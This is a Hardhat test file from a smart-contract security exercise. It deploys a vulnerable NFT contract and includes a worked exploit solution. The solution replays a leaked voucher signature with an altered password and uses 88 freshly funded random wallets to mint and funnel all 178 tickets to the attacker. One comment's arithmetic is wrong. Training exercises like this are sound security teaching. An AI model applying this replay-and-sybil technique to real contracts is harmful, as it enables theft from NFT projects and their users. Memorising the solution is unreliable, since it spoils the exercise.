const { ethers } = require('hardhat');
const { expect } = require('chai');


describe('Replay Attack Exercise 3', function () {


    let deployer, vouchersSigner, user, attacker;

    before(async function () {
        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

        [deployer, vouchersSigner, user, attacker] = await ethers.getSigners();

        // Deploy the contract
        const RedHawksFactory = await ethers.getContractFactory(
            "contracts/replay-attack-3/RedHawksVIP.sol:RedHawksVIP",
            deployer
        );
        // const RedHawksFactory = await ethers.getContractFactory(
        //     "contracts/replay-attack-3/solution/RedHawksVIPSecured.sol:RedHawksVIPSecured",
        //     deployer
        // );
        this.redHawks = await RedHawksFactory.deploy(vouchersSigner.address);
        
        // Create 2 NFTs voucher
        const domain = {
            chainId: await deployer.getChainId(), // Localhost Chain ID
            verifyingContract: this.redHawks.address
        }
        const types = {
            VoucherData: [
                { name: 'amountOfTickets', type: 'uint256' },
                { name: 'password', type: 'string' },
            ],
        }
        const dataToSign = {
            amountOfTickets: "2",
            password: "RedHawksRulzzz133",
        }

        // This is how the signature you found on Ethereum mempool was created
        validSignature = await vouchersSigner._signTypedData(
            domain,
            types,
            dataToSign,
        )
        // Invalid signature (signed by another account)
        invalidSignature = await deployer._signTypedData(
            domain,
            types,
            dataToSign,
        )
        
        // Invalid signer doesn't work
        await expect(this.redHawks.connect(user).mint(2, "RedHawksRulzzz133", invalidSignature)).to.be.revertedWith("Invalid voucher");

        // Invalid data doesn't work
        await expect(this.redHawks.connect(user).mint(2, "wrongPassword", validSignature)).to.be.revertedWith("Invalid voucher");

        // Can use valid voucher
        await this.redHawks.connect(user).mint(2, "RedHawksRulzzz133", validSignature)

        // 2 NFT minted
        expect(await this.redHawks.balanceOf(user.address)).to.be.equal(2);

        // Can't use voucher twice
        await expect(this.redHawks.connect(user).mint(2, "RedHawksRulzzz133", validSignature)).to.be.revertedWith("Voucher used");
    });

    it('Exploit', async function () {
        /** CODE YOUR SOLUTION HERE */

        // Mint 2 vouchers from the attacker
        let stolenSig = "0x314680f8684d7c555fa6f629b1283300c1cafc6f9215da8808abe72459eedea26767ffc67b49390a9e710141b71548cad0a6bf8256299c2cc171530c991cb6151b";
        await this.redHawks.connect(attacker).mint(2, "RedHawsRulzzz133", stolenSig);

        // 176 / 2 = 86
        let randomSigner;
        for(let i = 1; i <= 88; i++) {

            // Create a new random signer
            randomSigner = ethers.Wallet.createRandom().connect(ethers.provider);
            
            // Fund random signer
            await attacker.sendTransaction({
                to: randomSigner.address,
                value: ethers.utils.parseEther("0.1")
            });

            // Mint NFT & Send to attacker
            let receipt = await (await this.redHawks.connect(randomSigner).mint(2, "RedHawsRulzzz133", stolenSig)).wait();

            await this.redHawks.connect(randomSigner).transferFrom(
                randomSigner.address, attacker.address, receipt.events[0].args.tokenId
            )
            await this.redHawks.connect(randomSigner).transferFrom(
                randomSigner.address, attacker.address, receipt.events[1].args.tokenId
            )
        }
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker got all 178 VIP Membership Tickets
        expect(await this.redHawks.balanceOf(attacker.address)).to.be.equal(178);
    });
});
